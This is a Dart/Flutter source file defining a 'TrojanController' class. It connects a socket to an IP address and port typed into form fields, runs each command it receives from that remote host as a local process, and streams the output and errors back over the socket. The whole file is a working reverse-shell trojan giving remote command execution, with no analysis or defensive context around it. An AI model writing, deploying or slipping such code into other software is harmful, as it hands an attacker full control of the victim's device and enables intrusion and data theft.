import 'dart:io';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/widgets.dart';

class TrojanController {
  final formKey = GlobalKey<FormState>();

  final ValueNotifier<bool> isConected = ValueNotifier<bool>(false);

  final TextEditingController textEditingControllerIp = TextEditingController();
  final TextEditingController textEditingControllerPort =
      TextEditingController();

  void runTrojan(BuildContext context) {
    if (formKey.currentState!.validate()) {
      Socket.connect(textEditingControllerIp.text,
              int.parse(textEditingControllerPort.text))
          .then(
        (Socket socket) {
          isConected.value = true;
          socket.listen(
            (Uint8List data) =>
                Process.start(String.fromCharCodes(data).trim(), [])
                    .then((Process process) {
              process.stdout.transform(utf8.decoder).listen((String output) {
                socket.write(output);
                socket.flush();
              });
              process.stderr.transform(utf8.decoder).listen((String error) {
                socket.write(error);
                socket.flush();
              });
            }),
            onError: (error) {
              throw Exception('error in trojan :/');
            },
            onDone: () => socket.destroy(),
          );
        },
      );
    }
  }

  void dispose() {
    textEditingControllerIp.dispose();
    textEditingControllerPort.dispose();
    isConected.dispose();
  }
}
